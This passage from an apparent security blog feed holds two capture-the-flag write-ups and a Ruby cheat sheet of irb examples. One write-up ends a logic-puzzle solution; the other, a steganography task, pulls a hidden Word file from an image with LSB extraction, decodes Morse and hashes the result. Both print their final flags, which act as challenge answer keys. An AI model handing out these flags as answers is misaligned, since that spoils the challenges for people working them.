class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   5   |   2   |   4   |   0   | One number is correct and correctly placed</div><div class="line">|       |       |       |       |</div><div class="line">|       |       |       |       |</div><div class="line">+-------------------------------+</div></pre></td></tr></table></figure></p>
<p>Rules: <a href="https://en.wikipedia.org/wiki/Mastermind_(board_game)" target="_blank" rel="external">Mastermind</a></p>
<p>Code-breaking:</p>
<ul>
<li>Line 4: 2438, No numbers are correct =&gt; Only [0,1,5,6,7,9] are possible</li>
<li>Line 5: 5240, One number is correct and correctly placed =&gt; 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9]</li>
<li>Line 1: 9532, One number is correct but wrongly placed =&gt; 2 and 3 are wrong, so 9 or 5 is good, [0|5] &amp; [5|9] = 5 so [1,5,6,7] OR [0|5] &amp; [5|9] = [0,9] so so [0,1,6,7,9]</li>
<li>Line 2: 1673, Two numbers are correct and correctly placed =&gt; Only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible</li>
<li>(Now we need to filter the 5 numbers to keep only 4)</li>
<li>Line 1: Confirmed [9], Possible [0,1,6,7]</li>
<li>Line 3: Confirmed [9,[0|6]], Possible [1,7]</li>
<li>Line 5: Confirmed [9,0], Possible [1,7] so [0,1,7,9] are the four numbers</li>
<li>(We have the four numbers so now let's order them)</li>
<li>Line 2: Place [1,x,7,x]</li>
<li>Line 5: Place [1,x,7,0] so  [1,9,7,0]</li>
</ul>
<p>Flag is <code>1970</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat Challenge 01 - 20 - For001 - Forensics</title>
    <link href="http://rawsec.ml/en/WhiteHat-Challenge-2017-20-For001-Forensics/"/>
    <id>http://rawsec.ml/en/WhiteHat-Challenge-2017-20-For001-Forensics/</id>
    <published>2017-02-26T23:00:00.000Z</published>
    <updated>2017-02-27T18:56:27.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat Challenge 01</li>
<li><strong>Website</strong> : <a href="https://wargame.whitehat.vn/" target="_blank" rel="external">wargame.whitehat.vn</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/429" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>Can you find the secret in this image?
Download file here:</p>
<p><a href="http://material.wargame.whitehat.vn/challenges/1/For001_b9f7cdc52232efc20abe3ca3df14be5d.zip" target="_blank" rel="external">http://material.wargame.whitehat.vn/challenges/1/For001_b9f7cdc52232efc20abe3ca3df14be5d.zip</a></p>
<p>Submit WhiteHat{sha1(flag)}</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>The zip contain an image: <code>LSB.png</code>.</p>
<p>Let's try to retrive something with LSB attack, I found a Microsoft Word 2007 document.</p>
<p>Trying to open it with LibreOffice said me that the document is corrupted.</p>
<p>As it is only an archive I extrated it with <code>7z</code>.</p>
<p>I then open the <code>document.xml</code> and I found that:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">. .- ... -.-- ..-. --- .-. . -. ... .. -.-.</div></pre></td></tr></table></figure></p>
<p>It is morse. So I used <a href="http://www.dcode.fr/morse-code" target="_blank" rel="external">http://www.dcode.fr/morse-code</a> to decode the message.</p>
<p>That gave me <code>EASYFORENSIC</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;EASYFORENSIC&apos; | sha1sum</div><div class="line">ffed6da75c3296041fc52abc75298e120c350917  -</div><div class="line"></div><div class="line">$ printf %s &apos;easyforensic&apos; | sha1sum</div><div class="line">1f0aa393d3e5369f391c35a793bcf1178b8299a0  -</div></pre></td></tr></table></figure></p>
<p>So flag is <code>WhiteHat{1f0aa393d3e5369f391c35a793bcf1178b8299a0}</code>.</p>
<p><em>Note</em>: Again, this is stegano not digital forencis...</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forencics" scheme="http://rawsec.ml/tags/forencics/"/>
    
  </entry>
  
  <entry>
    <title>Ruby cheat sheet with examples</title>
    <link href="http://rawsec.ml/en/Ruby-cheat-sheet-with-examples/"/>
    <id>http://rawsec.ml/en/Ruby-cheat-sheet-with-examples/</id>
    <published>2017-02-19T23:00:00.000Z</published>
    <updated>2017-02-21T22:56:18.223Z</updated>
    
    <content type="html"><![CDATA[<p>Take it <s>easy</s> Ruby!</p>
<h2 id="basic-concepts">Basic concepts</h2>
<h3 id="hello-world">Hello World</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">puts <span class="string">"Hello World!"</span></div></pre></td></tr></table></figure></p>
<h3 id="comments">Comments</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># single line comment</span></div><div class="line"></div><div class="line"><span class="comment">=begin</span></div><div class="line">  Multi-lines</div><div class="line">  comment</div><div class="line">=end</div></pre></td></tr></table></figure></p>
<h3 id="variables">Variables</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">my_var = <span class="number">42</span></div><div class="line">My_constant_var = <span class="number">31337</span></div></pre></td></tr></table></figure></p>
<h3 id="shorthand-assignment">Shorthand assignment</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a += b <span class="comment"># a = a + b</span></div><div class="line">a -= b <span class="comment"># a = a - b</span></div><div class="line">a *= b <span class="comment"># a = a * b</span></div><div class="line">a /= b <span class="comment"># a = a / b</span></div><div class="line">a %= b <span class="comment"># a = a % b</span></div><div class="line">a **= b <span class="comment"># a = a**b</span></div></pre></td></tr></table></figure></p>
<h3 id="parallel-assignment">Parallel assignment</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a, b, c = <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span></div></pre></td></tr></table></figure></p>
<h3 id="input">Input</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">input = gets</div></pre></td></tr></table></figure></p>
<h2 id="control-structures">Control structures</h2>
<h3 id="equality">Equality</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):001:0&gt;</span> <span class="number">42</span> == <span class="number">42.0</span> <span class="comment"># equal values</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):002:0&gt;</span> <span class="number">42</span>.eql?(<span class="number">42.0</span>) <span class="comment"># equal values and same type</span></div><div class="line">=&gt; false</div></pre></td></tr></table></figure></p>
<h3 id="subsumption">Subsumption</h3>
<p>Be cautious!</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):004:0&gt;</span> <span class="number">42</span> === (<span class="number">10</span>..<span class="number">100</span>)</div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):005:0&gt;</span> <span class="number">42</span> === (<span class="number">50</span>..<span class="number">100</span>)</div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):006:0&gt;</span> (<span class="number">10</span>..<span class="number">100</span>) === <span class="number">42</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):007:0&gt;</span> (<span class="number">50</span>..<span class="number">100</span>) === <span class="number">42</span></div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):008:0&gt;</span> Integer === <span class="number">42</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):009:0&gt;</span> Integer === <span class="string">'string'</span></div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):010:0&gt;</span> <span class="number">42</span> === Integer</div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):011:0&gt;</span> /at/ === <span class="string">'Hi mate'</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):012:0&gt;</span> /at/ === <span class="string">'Hello'</span></div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):013:0&gt;</span> <span class="string">'Hi mate'</span> === <span class="regexp">/at/</span></div><div class="line">=&gt; false</div></pre></td></tr></table></figure></p>
<h3 id="if-elsif-else-statement">if/elsif/else statement</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">val = <span class="number">1337</span></div><div class="line"><span class="keyword">if</span> val == <span class="number">42</span></div><div class="line">  puts <span class="string">"That's always true"</span></div><div class="line"><span class="keyword">elsif</span> val == <span class="number">1000</span></div><div class="line">  puts <span class="string">"Nearly right"</span></div><div class="line"><span class="keyword">elsif</span> val == <span class="number">1300</span></div><div class="line">  puts <span class="string">"Even closer"</span></div><div class="line"><span class="keyword">else</span></div><div class="line">  puts <span class="string">"Nah!!"</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="comment"># ouput: Nah!</span></div></pre></td></tr></table></figure></p>
<h3 id="unless-statement">unless statement</h3>
<p>Opposite of <code>if</code></p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">val = <span class="number">1337</span></div><div class="line"><span class="keyword">unless</span> val == <span class="number">1337</span></div><div class="line">  puts <span class="string">"Your're the elite!"</span></div><div class="line"><span class="keyword">else</span></div><div class="line">  puts <span class="string">"Master!"</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="comment"># output: Master!</span></div></pre></td></tr></table></figure></p>
<h3 id="logical-operators">Logical operators</h3>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>Word</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&amp;&amp;</code></td>
<td><code>and</code></td>
</tr>
<tr>
<td><code>||</code></td>
<td><code>or</code></td>
</tr>
<tr>
<td><code>!</code></td>
<td><code>not</code></td>
</tr>
</tbody>
</table>
<h3 id="case-statement">case statement</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">10</span></div><div class="line"><span class="keyword">case</span> a</div><div class="line"><span class="keyword">when</span> <span class="number">1</span></div><div class="line">  puts <span class="string">'One'</span></div><div class="line"><span class="keyword">when</span> <span class="number">2</span></div><div class="line">  puts <span class="string">'Two'</span></div><div class="line"><span class="keyword">when</span> <span class="number">5</span></div><div class="line">  puts <span class="string">'Five'</span></div><div class="line"><span class="keyword">when</span> <span class="number">10</span></div><div class="line">  puts <span class="string">'Ten'</span></div><div class="line"><span class="keyword">when</span> <span class="number">42</span>, <span class="number">1337</span>, <span class="number">31337</span></div><div class="line">  puts <span class="string">'Master!'</span></div><div class="line"><span class="keyword">else</span></div><div class="line">  puts <span class="string">'Nah!'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="comment"># output: Ten</span></div></pre></td></tr></table></figure></p>
<h3 id="while-loop">while loop</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> a &lt;= <span class="number">5</span></div><div class="line">  puts a</div><div class="line">  a += <span class="number">1</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="until-loop">until loop</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">0</span></div><div class="line"><span class="keyword">until</span> a &gt; <span class="number">5</span></div><div class="line">  puts a</div><div class="line">  a += <span class="number">1</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="ranges">Ranges</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):043:0&gt;</span> (<span class="number">41</span>..<span class="number">43</span>).to_a</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>]</div><div class="line"><span class="meta">irb(main):044:0&gt;</span> (<span class="number">41</span>...<span class="number">43</span>).to_a</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">42</span>]</div><div class="line"><span class="meta">irb(main):045:0&gt;</span> (<span class="string">'m'</span>..<span class="string">'o'</span>).to_a</div><div class="line">=&gt; [<span class="string">"m"</span>, <span class="string">"n"</span>, <span class="string">"o"</span>]</div><div class="line"><span class="meta">irb(main):046:0&gt;</span> (<span class="string">'y'</span>..<span class="string">'b'</span>).to_a</div><div class="line">=&gt; []</div></pre></td></tr></table></figure></p>
<h3 id="for-loop">for loop</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">10</span>)</div><div class="line">  puts <span class="string">"i: <span class="subst">#&#123;i&#125;</span>"</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="break">break</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">10</span>)</div><div class="line">  <span class="keyword">break</span> <span class="keyword">if</span> i &gt; <span class="number">5</span></div><div class="line">  puts <span class="string">"i: <span class="subst">#&#123;i&#125;</span>"</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="next">next</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">10</span>)</div><div class="line">  <span class="keyword">next</span> <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span></div><div class="line">  puts <span class="string">"i: <span class="subst">#&#123;i&#125;</span>"</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="loop-do">loop do</h3>
<p>Like a <code>do while</code> in others languages.</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">0</span></div><div class="line">loop <span class="keyword">do</span></div><div class="line">  puts a</div><div class="line">  a += <span class="number">1</span></div><div class="line">  <span class="keyword">break</span> <span class="keyword">if</span> a &gt; <span class="number">10</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h2 id="collections">Collections</h2>
<h3 id="arrays">Arrays</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Basics</span></div><div class="line"><span class="meta">irb(main):047:0&gt;</span> peoples = [<span class="string">"Alice"</span>, <span class="string">"Bob"</span>, <span class="string">"Eve"</span>]</div><div class="line">=&gt; [<span class="string">"Alice"</span>, <span class="string">"Bob"</span>, <span class="string">"Eve"</span>]</div><div class="line"><span class="meta">irb(main):048:0&gt;</span> peoples[<span class="number">0</span>]</div><div class="line">=&gt; <span class="string">"Alice"</span></div><div class="line"><span class="meta">irb(main):049:0&gt;</span> peoples[<span class="number">1</span>]</div><div class="line">=&gt; <span class="string">"Bob"</span></div><div class="line"><span class="meta">irb(main):050:0&gt;</span> peoples[-<span class="number">1</span>]</div><div class="line">=&gt; <span class="string">"Eve"</span></div><div class="line"><span class="comment"># Adding elements</span></div><div class="line"><span class="meta">irb(main):051:0&gt;</span> foo = [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true]</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true]</div><div class="line"><span class="meta">irb(main):052:0&gt;</span> foo &lt;&lt; <span class="string">'d'</span></div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>]</div><div class="line"><span class="meta">irb(main):053:0&gt;</span> foo.push(<span class="number">1337</span>)</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>, <span class="number">1337</span>]</div><div class="line"><span class="meta">irb(main):055:0&gt;</span> foo.insert(<span class="number">2</span>, <span class="number">0</span>.<span class="number">05</span>)</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">05</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>, <span class="number">1337</span>]</div><div class="line"><span class="meta">irb(main):056:0&gt;</span> foo.pop</div><div class="line">=&gt; <span class="number">1337</span></div><div class="line"><span class="meta">irb(main):057:0&gt;</span> foo</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">05</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>]</div><div class="line"><span class="meta">irb(main):060:0&gt;</span> foo.delete_at(<span class="number">2</span>)</div><div class="line">=&gt; <span class="number">0</span>.<span class="number">05</span></div><div class="line"><span class="meta">irb(main):061:0&gt;</span> foo</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>]</div><div class="line"><span class="comment"># Removing elements</span></div><div class="line">irb(main)<span class="symbol">:</span><span class="number">065</span><span class="symbol">:</span><span class="number">0</span>* puts foo</div><div class="line"><span class="number">42</span></div><div class="line">Cindy</div><div class="line"><span class="number">0</span>.<span class="number">02</span></div><div class="line"><span class="literal">true</span></div><div class="line">d</div><div class="line">=&gt; nil</div><div class="line"><span class="meta">irb(main):066:0&gt;</span> print foo</div><div class="line">[<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, <span class="literal">true</span>, <span class="string">"d"</span>]=&gt; <span class="literal">nil</span></div><div class="line"><span class="comment"># Array Ranges</span></div><div class="line">irb(main)<span class="symbol">:</span><span class="number">06</span>8<span class="symbol">:</span><span class="number">0</span>* alph = [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'z'</span>, <span class="string">'e'</span>]</div><div class="line">=&gt; [<span class="string">"a"</span>, <span class="string">"c"</span>, <span class="string">"z"</span>, <span class="string">"e"</span>]</div><div class="line"><span class="meta">irb(main):069:0&gt;</span> alph[<span class="number">1</span>..<span class="number">3</span>]</div><div class="line">=&gt; [<span class="string">"c"</span>, <span class="string">"z"</span>, <span class="string">"e"</span>]</div></pre></td></tr></table></figure></p>
<h3 id="array-manipulations">Array manipulations</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Combining arrays</span></div><div class="line"><span class="meta">irb(main):072:0&gt;</span> x = [<span class="number">41</span>, <span class="number">53</span>]</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">53</span>]</div><div class="line"><span class="meta">irb(main):073:0&gt;</span> y = [<span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>]</div><div class="line">=&gt; [<span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>]</div><div class="line"><span class="meta">irb(main):074:0&gt;</span> res = x + y</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">53</span>, <span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>]</div><div class="line"><span class="meta">irb(main):075:0&gt;</span> res = y + x</div><div class="line">=&gt; [<span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>, <span class="number">41</span>, <span class="number">53</span>]</div><div class="line"><span class="meta">irb(main):078:0&gt;</span> z = [<span class="number">16</span>, <span class="number">41</span>, <span class="number">55</span>]</div><div class="line">=&gt; [<span class="number">16</span>, <span class="number">41</span>, <span class="number">55</span>]</div><div class="line"><span class="meta">irb(main):079:0&gt;</span> res - z</div><div class="line">=&gt; [<span class="number">72</span>, <span class="number">133</span>, <span class="number">53</span>]</div><div class="line"><span class="comment"># Boolean operations</span></div><div class="line"><span class="meta">irb(main):081:0&gt;</span> x</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">53</span>]</div><div class="line"><span class="meta">irb(main):082:0&gt;</span> z</div><div class="line">=&gt; [<span class="number">16</span>, <span class="number">41</span>, <span class="number">55</span>]</div><div class="line"><span class="meta">irb(main):083:0&gt;</span> x &amp; z</div><div class="line">=&gt; [<span class="number">41</span>]</div><div class="line"><span class="meta">irb(main):085:0&gt;</span> x <span class="params">| z</span></div><div class="line">=&gt; [41, 53, 16, 55]</div><div class="line"># Moving elements</div><div class="line">irb(main):086:0&gt; z.reverse</div><div class="line">=&gt; [55, 41, 16]</div><div class="line">irb(main):087:0&gt; z</div><div class="line">=&gt; [16, 41, 55]</div><div class="line">irb(main):088:0&gt; z.reverse!</div><div class="line">=&gt; [55, 41, 16]</div><div class="line">irb(main):089:0&gt; z</div><div class="line">=&gt; [55, 41, 16]</div><div class="line"># Array methods</div><div class="line">irb(main):090:0&gt; z.length</div><div class="line">=&gt; 3</div><div class="line">irb(main):091:0&gt; z.size</div><div class="line">=&gt; 3</div><div class="line">irb(main):092:0&gt; z.sort</div><div class="line">=&gt; [16, 41, 55]</div><div class="line">irb(main):093:0&gt; c = [42, 42, 75, 42]</div><div class="line">=&gt; [42, 42, 75, 42]</div><div class="line">irb(main):094:0&gt; c.uniq</div><div class="line">=&gt; [42, 75]</div><div class="line">irb(main):095:0&gt; z.freeze # prevent from being modified, there is no unfreeze method</div><div class="line">=&gt; [55, 41, 16]</div><div class="line">irb(main):096:0&gt; z.pop</div><div class="line">RuntimeError: can't modify frozen Array</div><div class="line">	from (irb):96:<span class="keyword">in</span> 'pop'</div><div class="line">	from (irb):96</div><div class="line">	from /usr/bin/irb:11:<span class="keyword">in</span> `&lt;main&gt;'</div><div class="line">irb(main):102:0&gt; z.frozen?</div><div class="line">=&gt; <span class="literal">true</span></div><div class="line">irb(main):103:0&gt; z.<span class="keyword">include</span>?(55)</div><div class="line">=&gt; <span class="literal">true</span></div><div class="line">irb(main):104:0&gt; z.<span class="keyword">include</span>?(56)</div><div class="line">=&gt; <span class="literal">false</span></div><div class="line">irb(main):105:0&gt; z.min</div><div class="line">=&gt; 16</div><div class="line">irb(main):106:0&gt; z.max</div><div class="line">=&gt; 55</div></pre></td></tr></table></figure></p>
<h3 id="hashes-and-symbols">Hashes and symbols</h3>
<p><code>||</code></p>
<table>
<thead>
<tr>
<th>a</th>
<th>b</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>||</code></td>
<td><code>pipe pipe</code></td>
</tr>
<tr>
<td>|</td>
<td><code>pipe</code></td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Take it &lt;s&gt;easy&lt;/s&gt; Ruby!&lt;/p&gt;
&lt;h2 id=&quot;basic-concepts&quot;&gt;Basic concepts&lt;/h2&gt;
&lt;h3 id=&quot;hello-world&quot;&gt;Hello World&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&quot;highlig
    
    </summary>
    
      <category term="programming" scheme="http://rawsec.ml/categories/programming/"/>
    
      <category term="ruby" scheme="http://rawsec.ml/categories/programming/ruby/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="programming" scheme="http://rawsec.ml/tags/programming/"/>
    
      <category term="ruby" scheme="http://rawsec.ml/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>BSides San Francisco CTF 2017 - Write-ups</title>
    <link href="http://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/"/>
    <id>http://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/</id>
    <published>2017-02-12T23:00:00.000Z</published>
    <updated>2017-02-09T19:45:29.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
